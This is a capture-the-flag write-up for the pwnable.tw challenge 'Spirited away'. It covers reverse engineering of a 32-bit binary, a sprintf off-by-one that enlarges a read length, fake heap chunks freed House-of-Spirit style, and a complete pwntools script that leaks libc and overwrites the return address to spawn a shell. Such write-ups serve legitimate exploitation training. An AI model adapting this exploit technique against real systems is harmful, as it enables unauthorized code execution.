---
date: '2025-08-29T12:52:53+07:00'
draft: false
title: 'Spirited away (300 pts) - pwnable.tw'
tags: ["pwnable.tw"]
---


## 0x1. Initial Reconnaissance

### file
```bash
↪ file spirited_away
spirited_away: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=9e6cd4dbfea6557127f3e9a8d90e2fe46b21f842, not stripped
```

### checksec 
```bash
↪ checksec --file=spirited_away
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   80 Symbols	  No	0		4		spirited_away
```

### ./spirited_away
```
↪ ./spirited_away
Thanks for watching Spirited Away!
Please leave some comments to help us improve our next movie!

Please enter your name: ndd
Please enter your age: 18'
Why did you came to see this movie? bored
Please enter your comment: bullshit
Name: ndd

Age: 18
Reason: bored

>��@M��
       >��!'��@M���&��=
Comment: bullshit


1 comment so far. We will review them as soon as we can

Would you like to leave another comment? <y/n>:
```


## 0x2. Reverse Engineering

### survey
```c
int survey()
{
  char v1[56]; // [esp+10h] [ebp-E8h] BYREF
  int v2; // [esp+48h] [ebp-B0h]
  int v3; // [esp+4Ch] [ebp-ACh]
  char v4[80]; // [esp+50h] [ebp-A8h] BYREF
  int v5; // [esp+A0h] [ebp-58h] BYREF
  const char *v6; // [esp+A4h] [ebp-54h]
  char v7[80]; // [esp+A8h] [ebp-50h] BYREF

  v2 = 60;
  v3 = 80;
LABEL_2:
  memset(v4, 0, sizeof(v4));
  v6 = (const char *)malloc(60);
  printf("\nPlease enter your name: ");
  fflush(stdout);
  read(0, v6, v2);
  printf("Please enter your age: ");
  fflush(stdout);
  __isoc99_scanf("%d", &v5);
  printf("Why did you came to see this movie? ");
  fflush(stdout);
  read(0, v7, v3);
  fflush(stdout);
  printf("Please enter your comment: ");
  fflush(stdout);
  read(0, v4, v2);
  ++cnt;
  printf("Name: %s\n", v6);
  printf("Age: %d\n", v5);
  printf("Reason: %s\n", v7);
  printf("Comment: %s\n\n", v4);
  fflush(stdout);
  sprintf(v1, "%d comment so far. We will review them as soon as we can", cnt);
  puts(v1);
  puts(&unk_8048A81);
  fflush(stdout);
  if ( cnt > 199 )
  {
    puts("200 comments is enough!");
    fflush(stdout);
    exit(0);
  }
  while ( 1 )
  {
    printf("Would you like to leave another comment? <y/n>: ");
    fflush(stdout);
    read(0, &choice, 3);
    if ( choice == 89 || choice == 121 )
    {
      free(v6);
      goto LABEL_2;
    }
    if ( choice == 78 || choice == 110 )
      break;
    puts("Wrong choice.");
    fflush(stdout);
  }
  puts("Bye!");
  return fflush(stdout);
}
```


## 0x3. Analysis

This challenge allows us to write our name with ```v2``` bytes to a chunk of 60 bytes (the address of the chunk stored at ```v6```), an integer to ```v5```, ```v3``` bytes to ```v7[80]``` and ```v2``` bytes to ```v4[80]```. Copy ```"%d comment so far. We will review them as soon as we can"``` to ```v1[56]```. And their sequence on stack will be like that:

```
ebp - 0xe8 -> v1[0]
+4         -> v1[1]
...
+52        -> v1[55]
ebp - 0xb0 -> v2 (Size of name and comment)
+4         -> v3 (Size of reason)
ebp - 0xa8 -> v4[0] (comment)
+4         -> v4[1]
...
+76        -> v4[79]
ebp - 0x58 -> v5 (age)
+4         -> v6 (pointer of name)
ebp - 0x50 -> v7[0] (reason)
+4         -> v7[1]
...
+76        -> v7[79]
ebp        -> ... 
```


## 0x3. Exploit

In this challenge you can easily get the leak of libc on the stack, because they print ```comment, reason, name``` with ```%s``` format. 

They copy the sequence to ```v1[56]``` using ```sprintf```, and if the ```cnt``` integer has 3 numbers, the consequence will have 57 bytes, thus overwriting ```v2``` to 'n' which is 0x6e. As a result, we can overwrite a fake chunk to pointer of the chunk (```v6```). Create a fake chunk at ```v7[80]```, and then create a new comment, now you can write 0x6e bytes to ```v7[80]```, which is right above the ebp, overwriting eip :DD.

Notice that, ```sprintf``` will add a null byte to the end of sequence, so if ```cnt``` integer has 2 numbers, ```v2``` will be overwritten to 0 and we can't no longer input name and comment.

Another noticeable thing is that ```libc 2.23``` doesn't have tcache. They will check whether the chunk is adjacent to the top chunk or not before freeing it, if not they will check the size of the next chunk. Thus build 2 fake chunks to bypass !!!
```py
#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))

if (__builtin_expect (chunk_at_offset (p, size)->size <= 2 * SIZE_SZ, 0)
|| __builtin_expect (chunksize (chunk_at_offset (p, size))
                >= av->system_mem, 0))
{
    if (have_lock
    || ({ assert (locked == 0);
        mutex_lock(&av->mutex);
        locked = 1;
        chunk_at_offset (p, size)->size <= 2 * SIZE_SZ
        || chunksize (chunk_at_offset (p, size)) >= av->system_mem;
        }))
    {
    errstr = "free(): invalid next size (fast)";
    goto errout;
    }
    if (! have_lock)
    {
        (void)mutex_unlock(&av->mutex);
        locked = 0;
    }
}
```

##### Exploit
```py
from pwn import *

exe = ELF("./spirited_away_patched")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe
context.log_level = "debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug ([exe.path], "b *survey")
    else:
        r = remote("chall.pwnable.tw", 10204)

    return r

def Input (p, name, age, reason, comment):
    p.sendafter (b'name: ', name)
    p.sendlineafter (b'age: ', age)
    p.sendafter (b'movie? ', reason)
    p.sendafter (b'comment: ', comment)

def Input_after_10 (p, age, reason):
    p.sendlineafter (b'age: ', age)
    p.sendafter (b'movie? ', reason)

def main():
    p = conn()
    Input (p, b'ndd', b'12', b'A' * 9, b'bullshit')
    p.recvuntil (b'A' * 8)
    leak = u32 (p.recv(4))
    libc.address = leak - 0x1e2041
    print ("The leak is: ", hex (leak))
    print ("the address of libc is: ", hex (libc.address))

    p.sendlineafter (b'<y/n>: ', b'y')

    Input (p, b'ndd', b'12', b'A' * 56, b'yyyyyy')
    p.recvuntil (b'A' * 56)
    leak = u32 (p.recv (4))
    ebp = leak - 0x20
    print ("The leak is : ", hex (leak))
    print ("The ebp is : ", hex (ebp))

    cnt = 3
    for i in range (98):
        p.sendlineafter (b'<y/n>: ', b'y')
        if cnt < 11:
            Input (p, b'ndd', b'12', b'onepieceisreal', b'bullshit')
        else:
            Input_after_10 (p, b'12', b'abcd')
        p.recvuntil (b'We will review them as soon as we can\n')
        print ("-----------------------------------------", cnt, "times -------------------------------------------------------------------------------")
        cnt += 1

    p.sendlineafter (b'<y/n>: ', b'y')
    Input (p, b'ndd', b'12', p32 (0) + p32 (0x41) + b'\x00' * 56 + p32 (0) + p32 (0x21), b'A' * 0x50 + p32 (12) + p32 (ebp - 0x50 + 0x8))

    p.sendlineafter (b'<y/n>: ', b'y')
    payload = b'A' * (0x50 - 0x8 + 0x4) + p32 (libc.symbols['system']) + p32(0) + p32 (next (libc.search (b'/bin/sh')))
    Input (p, payload, b'12', b'A', b'A')    

    p.sendlineafter (b'<y/n>: ', b'n')
    p.interactive()


if __name__ == "__main__":
    main()
```
